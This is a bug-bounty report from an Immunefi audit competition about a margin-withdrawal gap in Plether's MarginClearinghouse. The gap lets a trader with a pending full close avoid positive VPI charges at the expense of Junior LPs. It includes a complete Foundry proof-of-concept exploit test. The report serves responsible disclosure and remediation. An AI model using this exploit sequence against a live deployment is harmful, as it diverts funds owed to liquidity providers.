# \#99795 [SC-Medium] A pending full close allows margin withdrawal that waives VPI charges owed to the Pool

**Submitted on Nov 15th 2026 at 09:47:06 UTC by @Paludo0x for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99795
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description


## Brief/Intro

After a trader commits a full close, `MarginClearinghouse` still lets that trader withdraw free settlement without retaining backing for the close's positive VPI charge. Execution collects only the remaining eligible account assets and waives the shortfall. An unrelated Junior LP consequently receives less USDG when its redemption settles at the same basket mark.

## Vulnerability Details

### Root cause in the frozen source

The affected version is the competition's frozen perps source at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. The public `MarginClearinghouse.withdrawMargin()` path reduces the account's settlement balance before asking the Engine to validate the withdrawal. The relevant [production code](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol#L446-L474) is:

```solidity
settlementBalances[account] -= amount;

if (engine_ != address(0)) {
    IWithdrawGuard(engine_).checkWithdraw(account);
}

uint256 remainingEquity = getAccountEquityAssets(account);
uint256 totalLockedMargin = _totalLockedMarginAssets(account);
if (remainingEquity < totalLockedMargin) {
    revert MarginClearinghouse__InsufficientFreeEquity();
}
if (settlementBalances[account] < totalLockedMargin) {
    revert MarginClearinghouse__InsufficientAssetsForSettlement();
}

IERC20(settlementAsset).safeTransfer(owner, amount);
```

The pending-order settlement floor is checked only when the position has already closed. [`CfdEngineSettlementSidecar.validateWithdraw`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L255-L280) takes a different branch while the committed position remains open:

```solidity
if (pos.size == 0) {
    (uint64 orderId, uint256 minimum, uint256 maxDebit) =
        OrderSettlementFloorLib.load(engine.orderRouter(), account);
    if (minimum != 0) {
        uint256 balance = IMarginClearinghouse(host.clearinghouse()).balanceAssets(account);
        if (balance < minimum || balance - minimum < maxDebit) {
            revert IOrderRouterErrors.OrderRouter__SettlementFloorWithdrawal(
                orderId, balance, minimum, maxDebit
            );
        }
    }
    return;
}
```

The Router also rejects a positive settlement floor on a close request in [`_validateFreshRequest`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L307-L312):

```solidity
if (bounds.minPostSettlementBalanceAssets != 0) {
    (uint256 positionSize,,,,,,) = host.engine().positions(account);
    if (request.isClose || positionSize != 0 || head != 0) {
        revert OrderRouter__SettlementFloorUnsupported();
    }
}
```

For an open position, [`_requireWithdrawPositionHealthy`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L286-L304) checks unsettled carry, the reserve for *negative* accrued VPI, and price-risk liquidation. It does not retain the positive VPI that closing the still-open position would charge:

```solidity
if (engine.unsettledCarryAssets(account) != 0) {
    revert ICfdEngineTypes.CfdEngine__WithdrawBlockedByOpenPosition();
}
IMarginClearinghouse clearinghouse = IMarginClearinghouse(host.clearinghouse());
if (clearinghouse.vpiRebateReserveAssets(account) < _negativeVpiReserveTarget(pos.vpiAccrued)) {
    revert ICfdEngineTypes.CfdEngine__WithdrawBlockedByOpenPosition();
}
uint256 reachableAssets = clearinghouse.pnlPledgeAssets(account) + engine.traderClaimBalanceAssets(account);
if (_withdrawPositionLiquidatable(engine, pos, account, price, reachableAssets)) {
    revert ICfdEngineTypes.CfdEngine__WithdrawBlockedByOpenPosition();
}
```

The [reserve target](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L373-L379) is zero unless `vpiAccruedAssets < 0`. Closing the position assesses a fresh signed VPI delta from the live skew and pool depth in [`CloseAccountingLib.buildCloseState`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L103-L126). The full-close planner then limits collection to the account's remaining eligible buckets and records the unpaid part as a waiver. The decisive [production lines](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1108-L1134) are:

```solidity
uint256 collectibleFreeSettlementAssets = snap.accountBuckets.freeSettlementAssets + releasedVpiReserveAssets;
if (terminal) {
    // The full-close reserve is released before pledge attribution and cash collection.
    collectibleFreeSettlementAssets += delta.liquidationReserveReleaseAssets;
}
uint256 freeConsumedAssets = actionChargeAfterReserveAssets < collectibleFreeSettlementAssets
    ? actionChargeAfterReserveAssets
    : collectibleFreeSettlementAssets;
uint256 actionChargeAfterFreeAssets = actionChargeAfterReserveAssets - freeConsumedAssets;
delta.actionChargeFromReleasedMarginAssets = actionChargeAfterFreeAssets < delta.unlockMarginAssets
    ? actionChargeAfterFreeAssets
    : delta.unlockMarginAssets;
actionChargeAfterFreeAssets -= delta.actionChargeFromReleasedMarginAssets;
if (terminal) {
    delta.actionCommittedMarginConsumedAssets = actionChargeAfterFreeAssets
        < snap.lockedBuckets.committedOrderMarginAssets
        ? actionChargeAfterFreeAssets
        : snap.lockedBuckets.committedOrderMarginAssets;
}
delta.actionChargeCollectedAssets = delta.vpiRebateReserveConsumedAssets + delta.actionReserveConsumedAssets
    + freeConsumedAssets + delta.actionChargeFromReleasedMarginAssets
    + delta.actionCommittedMarginConsumedAssets;
delta.actionChargeWaivedAssets = delta.actionChargeToCollectAssets - delta.actionChargeCollectedAssets;
```

The current close collects every eligible asset **at execution**. The missing boundary is earlier: an otherwise healthy position owner can commit the close, then transfer free settlement out of the clearinghouse before execution assesses the positive charge. No subsequent step recovers that withdrawn cash or includes it in the charge's collectible sources.

### Attack path

1. A trader controls an open position whose full close will increase side skew and therefore assess positive VPI. An unrelated Junior LP has shares or a pending redemption. The trader can establish the required skew using ordinary public V3 orders from separate accounts.
2. The trader commits a full close through the public V3 Router. While that order is pending and the position remains open, the trader calls `MarginClearinghouse.withdrawMargin()` to transfer free settlement to its wallet. The withdrawal passes the position-health and locked-bucket checks.
3. The trader executes the committed close at an eligible signed basket update. Positive VPI is assessed, but the reduced free settlement and released collateral cannot pay it all; the terminal planner records the remainder as `actionChargeWaivedAssets`.
4. The Junior LP's ordinary epoch settlement and `claimRedeem()` run at the same basket mark. Less charge revenue has reached `HousePool`, so the LP receives less USDG than in the otherwise identical sequence without the prior margin withdrawal.

The attacker needs no owner, guardian, oracle-worker, or privileged keeper authority for these steps. No favorable market move is required for the difference between the two sequences.

### Distinction from public disclosures and remediation

[PR #104](https://github.com/Plether-Fi/plether-core/pull/104), merged as `59346315864430ded402fb3c9ad47c41d67177ab` on 9 October 2026, fixed a full close that waived a charge and then **returned collateral from that same close** which could have paid it. Its collection-order fix is present in the frozen source. The remaining gap is cross-transaction: after a successful close commitment, `validateWithdraw` permits the account to remove cash that would otherwise fund the assessed charge at execution. Reordering funds inside the later close cannot collect cash already transferred to the trader.

The [October scan's temporary-pool-liquidity finding](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md#L1693-L1741) changes the *amount of VPI assessed* through pool depth. This path changes the *amount of an assessed charge collected* through the trader's own margin withdrawal. The PoC compares assessment, collection, and waiver separately.

The trader need not own LP shares, redeem an earlier VPI inflow, receive a close rebate, or rely on a price-loss write-off. The close in this path assesses a positive charge; the loss comes from the charge that the trader's intervening withdrawal leaves uncollectible.

Withdrawal validation should preserve enough eligible backing for the pending close's currently assessable charge, or prevent a voluntary withdrawal from reducing that charge's collectible funding.

## Impact Details

Selected in-scope impact: **Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)**. The affected security parameter is collection of positive VPI from a trader account after its full-close order is committed. The trader can keep cash that the close would otherwise transfer to `HousePool`; an unrelated Junior LP's funded redemption then pays fewer USDG for the same shares at the same market mark. The primary affected asset is `MarginClearinghouse.sol`, which permits the intervening withdrawal; `HousePool.sol` and `TrancheVault.sol` carry the resulting lower LP payment.


## Proof of Concept

## PoC Explanation

PoC file: `PreCloseWithdrawVpiWaiverPoC.t.sol`. Place this single file at `packages/perps/test/perps/spec/PreCloseWithdrawVpiWaiverPoC.t.sol` in a checkout of commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. From the repository root, run:

```bash
forge test --root packages/perps --match-path test/perps/spec/PreCloseWithdrawVpiWaiverPoC.t.sol --match-test test_PreCloseWithdrawalWaivesVpiAndReducesJuniorRedemption -vv
```

Expected result: one passing test. The test starts two branches from the same Foundry snapshot. Both use the public V3 `commitOrder(OrderRequest)` and `executeOrder()` path, the release risk and fee settings, six feed IDs with release weights/bases/inversions, and simulated one-basis-point feed confidence. In the attack branch, the LONG trader withdraws after `commitOrder` succeeds and before `executeOrder`; the control branch executes the same close without that withdrawal. The synthetic neutral basket mark remains `1e8` throughout; the opening margin is 60 bps on each leg of a matched LONG/SHORT pair. Both branches close both legs, withdraw remaining trader balances, settle the same Junior redemption at the same later timestamp, and claim the same shares.

In the control branch, the full closes assess and collect `18,582.773595` USDG of action charges, with zero waived. In the withdrawal branch, the LONG trader withdraws `185,060` USDG after committing its close; the closes assess `18,582.773606` USDG, collect `14,813.712019` USDG, and waive `3,769.061587` USDG. The trader keeps `3,769.061576` USDG more than in the control branch and the Pool receives exactly that much less before LP redemption. The Junior LP receives `241,298.000755` USDG rather than `241,674.906756` USDG, a wallet difference of `376.906001` USDG; the remaining Pool-value difference stays with incumbent LP shares. The trader's full two-sided cycle is still negative (`-17,056.276705` USDG versus `-20,825.338281` USDG without the intervening withdrawal). The PoC asserts that both closes have zero `priceLossWrittenOffAssets` in both branches, alongside accounting conservation, equal treasury credits, full collection in the control, a positive waiver after withdrawal, and the smaller claimed LP payout.

The only test harness dependency is the repository's `BasePerpTest`. That first-party fixture deploys a `LegacyOrderRouterHarness`, but this PoC calls its inherited production V3 methods and does not use the scalar test adapter. The fixture's owner configuration installs the release oracle geometry before the attack starts. `MockPyth` and the mock settlement token replace external dependencies permitted by the competition; the in-scope contracts are unchanged. The PoC does not use a public-chain transaction and does not measure network gas or live oracle-update costs.

```
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {Vm} from "forge-std/Vm.sol";

/// @notice A pending full close does not preserve charge funding across a margin withdrawal.
/// @dev One self-contained test file. Only the repository's existing BasePerpTest fixture is imported.
contract PreCloseWithdrawVpiWaiverPoC is BasePerpTest {
    address internal constant JUNIOR_LP = address(0xB0B);
    address internal constant SENIOR_LP = address(0x515E);
    address internal constant LONG_TRADER = address(0xB011);
    address internal constant SHORT_TRADER = address(0xBEA2);
    uint256 internal constant FLAT_MARK = 1e8;

    bytes32[6] internal feedIds = [
        bytes32(0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b),
        bytes32(0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52),
        bytes32(0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1),
        bytes32(0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca),
        bytes32(0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676),
        bytes32(0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8)
    ];
    uint256[6] internal bases = [
        uint256(117_500_000), 638_000, 134_480_000, 72_880_000, 10_860_000, 126_100_000
    ];
    bool[6] internal inverted = [false, true, false, true, true, true];
    uint256 internal orderNonce;
    bool internal withdrawAfterLongCloseCommit;
    uint256 internal committedCloseWithdrawAmount;

    struct Arm {
        int256 actorDelta;
        int256 poolDelta;
        int256 treasuryDelta;
        uint256 assessed;
        uint256 collected;
        uint256 waived;
        uint256 withdrawnBeforeClose;
        uint256 juniorPayout;
        uint256 poolAfterRedeem;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) { return 0; }
    function _initialSeniorDeposit() internal pure override returns (uint256) { return 0; }
    function _initialJuniorSeedDeposit() internal pure override returns (uint256) { return 1e6; }
    function _initialSeniorSeedDeposit() internal pure override returns (uint256) { return 1e6; }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        _fundJunior(JUNIOR_LP, 2_400_000e6);
        _fundSenior(SENIOR_LP, 100_000e6);

        bytes32[] memory ids = new bytes32[](6);
        uint256[] memory weights = new uint256[](6);
        uint256[] memory oracleBases = new uint256[](6);
        bool[] memory inversions = new bool[](6);
        uint256[6] memory releaseWeights = [uint256(576e15), 136e15, 119e15, 91e15, 42e15, 36e15];
        for (uint256 i; i < 6; ++i) {
            ids[i] = feedIds[i];
            weights[i] = releaseWeights[i];
            oracleBases[i] = bases[i];
            inversions[i] = inverted[i];
            uint256 raw = inverted[i] ? 1e16 / bases[i] : bases[i];
            baseMockPyth.setPrice(feedIds[i], int64(uint64(raw)), -8, block.timestamp);
        }
        PletherOracle sixFeedOracle = new PletherOracle(
            address(engine), address(pool), address(baseMockPyth), ids, weights, oracleBases, inversions
        );
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2500;
        config.minOpenNotionalAssets = 1000e6;
        routerAdmin.proposeRouterConfig(config);
        routerAdmin.proposeOracleConfig(IOrderRouterAdminHost.OracleConfig(address(sixFeedOracle)));
        uint256 activation = routerAdmin.oracleConfigActivationTime();
        if (routerAdmin.routerConfigActivationTime() > activation) {
            activation = routerAdmin.routerConfigActivationTime();
        }
        vm.warp(activation);
        routerAdmin.finalizeOracleConfig();
        routerAdmin.finalizeRouterConfig();
        baseMockPyth.setSynchronizeLegacyUniquePrices(false);

        uint256 day = block.timestamp / 1 days;
        uint256 weekday = (day + 4) % 7;
        uint256 monday10 = (day + ((8 - weekday) % 7)) * 1 days + 10 hours;
        if (monday10 <= block.timestamp) monday10 += 7 days;
        vm.warp(monday10);
        vm.roll(block.number + 1);
        router.updateMarkPrice(_tick());
    }

    function _tick() internal view returns (bytes[] memory updateData) {
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](6);
        for (uint256 i; i < 6; ++i) {
            uint256 raw = inverted[i] ? 1e24 / (bases[i] * FLAT_MARK) : bases[i] * FLAT_MARK / 1e8;
            updates[i] = MockPyth.FeedUpdate(
                feedIds[i], MockPyth.MockPrice(int64(uint64(raw)), uint64(raw / 10_000), -8, block.timestamp, block.timestamp - 2)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(updates);
    }

    function _execute(
        address trader, CfdTypes.Side side, uint256 size, uint256 margin,
        uint256 targetPrice, bool isClose
    ) internal returns (OrderV3Types.OrderReceipt memory receipt) {
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = keccak256(abi.encode("PreCloseWithdraw", trader, ++orderNonce));
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = targetPrice;
        request.isClose = isClose;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp + window),
            executionWindowSeconds: uint32(window),
            allowedExecutionModes: 7,
            expectedConfigHash: OrderLifecycleBook(router.lifecycleBook()).currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
        vm.prank(trader);
        uint64 orderId = router.commitOrder(request);
        if (isClose && trader == LONG_TRADER && withdrawAfterLongCloseCommit) {
            committedCloseWithdrawAmount = _maximumValidWithdraw(LONG_TRADER);
        }
        vm.warp(block.timestamp + 2);
        vm.roll(block.number + 1);
        vm.recordLogs();
        vm.prank(trader);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, _tick());
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bool found;
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].emitter == address(router.lifecycleBook()) && logs[i].topics.length == 4 &&
                logs[i].topics[0] == IOrderLifecycleBook.OrderFinalized.selector &&
                uint256(logs[i].topics[1]) == uint256(orderId)) {
                (,,, receipt) = abi.decode(logs[i].data, (bytes32, uint64, uint64, OrderV3Types.OrderReceipt));
                found = true;
            }
        }
        assertTrue(found, "V3 order receipt missing");
    }

    function _openPair() internal {
        uint256[3] memory sizes = [uint256(900_000e18), 900_000e18, 690_000e18];
        for (uint256 i; i < sizes.length; ++i) {
            uint256 margin = (sizes[i] / 1e12 * 60) / 10_000;
            _execute(LONG_TRADER, CfdTypes.Side.LONG, sizes[i], margin, 99_000_000, false);
            _execute(SHORT_TRADER, CfdTypes.Side.SHORT, sizes[i], margin, 101_000_000, false);
        }
    }

    function _maximumValidWithdraw(address trader) internal returns (uint256 amount) {
        uint256 high = clearinghouse.balanceAssets(trader);
        while (amount < high) {
            uint256 mid = (amount + high + 1) / 2;
            uint256 snapshot = vm.snapshotState();
            vm.prank(trader);
            try clearinghouse.withdrawMargin(mid) { amount = mid; }
            catch { high = mid - 1; }
            assertTrue(vm.revertToState(snapshot));
        }
        assertGt(amount, 0, "no margin withdrawal available");
        vm.prank(trader);
        clearinghouse.withdrawMargin(amount);
    }

    function _wealth() internal view returns (uint256) {
        return settlementToken.balanceOf(LONG_TRADER) + settlementToken.balanceOf(SHORT_TRADER)
            + clearinghouse.balanceAssets(LONG_TRADER) + clearinghouse.balanceAssets(SHORT_TRADER);
    }

    function _runArm(bool withdrawFirst, uint256 requestId, uint256 shares, uint256 settleAt)
        internal returns (Arm memory outcome)
    {
        uint256 actorBefore = _wealth();
        uint256 poolBefore = pool.rawAssets();
        uint256 treasuryBefore = clearinghouse.balanceAssets(engine.protocolTreasury());
        _openPair();
        withdrawAfterLongCloseCommit = withdrawFirst;

        OrderV3Types.OrderReceipt memory longClose = _execute(
            LONG_TRADER, CfdTypes.Side.LONG, 2_490_000e18, 0, 102_000_000, true
        );
        outcome.withdrawnBeforeClose = committedCloseWithdrawAmount;
        withdrawAfterLongCloseCommit = false;
        OrderV3Types.OrderReceipt memory shortClose = _execute(
            SHORT_TRADER, CfdTypes.Side.SHORT, 2_490_000e18, 0, 99_000_000, true
        );
        assertEq(longClose.economics.close.priceLossWrittenOffAssets, 0, "LONG price-loss write-off");
        assertEq(shortClose.economics.close.priceLossWrittenOffAssets, 0, "SHORT price-loss write-off");
        outcome.assessed = longClose.economics.actionChargeAssessedAssets
            + shortClose.economics.actionChargeAssessedAssets;
        outcome.collected = longClose.economics.actionChargeCollectedAssets
            + shortClose.economics.actionChargeCollectedAssets;
        outcome.waived = longClose.economics.close.actionChargeWaivedAssets
            + shortClose.economics.close.actionChargeWaivedAssets;
        assertEq(outcome.assessed, outcome.collected + outcome.waived);

        uint256 longBalance = clearinghouse.balanceAssets(LONG_TRADER);
        uint256 shortBalance = clearinghouse.balanceAssets(SHORT_TRADER);
        if (longBalance != 0) {
            vm.prank(LONG_TRADER);
            clearinghouse.withdrawMargin(longBalance);
        }
        if (shortBalance != 0) {
            vm.prank(SHORT_TRADER);
            clearinghouse.withdrawMargin(shortBalance);
        }
        outcome.actorDelta = int256(_wealth()) - int256(actorBefore);
        outcome.poolDelta = int256(pool.rawAssets()) - int256(poolBefore);
        outcome.treasuryDelta = int256(clearinghouse.balanceAssets(engine.protocolTreasury()))
            - int256(treasuryBefore);

        vm.warp(settleAt);
        vm.roll(block.number + 1);
        router.updateMarkPrice(_tick());
        router.settleLpEpoch(_tick());
        assertEq(juniorVault.claimableRedeemRequest(requestId, JUNIOR_LP), shares);
        vm.prank(JUNIOR_LP);
        outcome.juniorPayout = juniorVault.claimRedeem(requestId, shares, JUNIOR_LP, JUNIOR_LP);
        outcome.poolAfterRedeem = pool.rawAssets();
    }

    function test_PreCloseWithdrawalWaivesVpiAndReducesJuniorRedemption() public {
        _fundTrader(LONG_TRADER, 200_000e6);
        _fundTrader(SHORT_TRADER, 200_000e6);
        uint256 unlockAt = juniorVault.lastDepositTime(JUNIOR_LP) + juniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp < unlockAt) vm.warp(unlockAt);
        uint256 shares = juniorVault.balanceOf(JUNIOR_LP) / 10;
        vm.prank(JUNIOR_LP);
        uint256 requestId = juniorVault.requestRedeem(shares, JUNIOR_LP, JUNIOR_LP);
        uint256 settleAt = pool.lpEpochStart(requestId) + 2 hours + 100;
        uint256 snapshot = vm.snapshotState();

        Arm memory control = _runArm(false, requestId, shares, settleAt);
        assertTrue(vm.revertToState(snapshot));
        Arm memory attack = _runArm(true, requestId, shares, settleAt);

        assertEq(control.waived, 0);
        assertGt(attack.waived, 0);
        assertGt(attack.actorDelta, control.actorDelta);
        assertLt(attack.poolDelta, control.poolDelta);
        assertEq(attack.treasuryDelta, control.treasuryDelta);
        assertEq(attack.actorDelta - control.actorDelta, control.poolDelta - attack.poolDelta);
        assertLt(attack.juniorPayout, control.juniorPayout);
        assertEq(
            int256(attack.poolAfterRedeem) - int256(control.poolAfterRedeem)
                + int256(attack.juniorPayout) - int256(control.juniorPayout),
            attack.poolDelta - control.poolDelta
        );

        emit log_named_uint("withdrawal_before_close", attack.withdrawnBeforeClose);
        emit log_named_uint("control_charge_assessed", control.assessed);
        emit log_named_uint("control_charge_collected", control.collected);
        emit log_named_uint("attack_charge_assessed", attack.assessed);
        emit log_named_uint("attack_charge_collected", attack.collected);
        emit log_named_uint("attack_charge_waived", attack.waived);
        emit log_named_int("actor_gain_relative_to_normal_close", attack.actorDelta - control.actorDelta);
        emit log_named_int("control_actor_total_cycle_result", control.actorDelta);
        emit log_named_int("actor_total_cycle_result", attack.actorDelta);
        emit log_named_int("control_pool_delta", control.poolDelta);
        emit log_named_int("attack_pool_delta", attack.poolDelta);
        emit log_named_int("pool_difference_before_lp_redeem", attack.poolDelta - control.poolDelta);
        emit log_named_uint("control_junior_redeem_payout", control.juniorPayout);
        emit log_named_uint("attack_junior_redeem_payout", attack.juniorPayout);
        emit log_named_int("junior_lp_wallet_difference", int256(attack.juniorPayout) - int256(control.juniorPayout));
    }
}

```
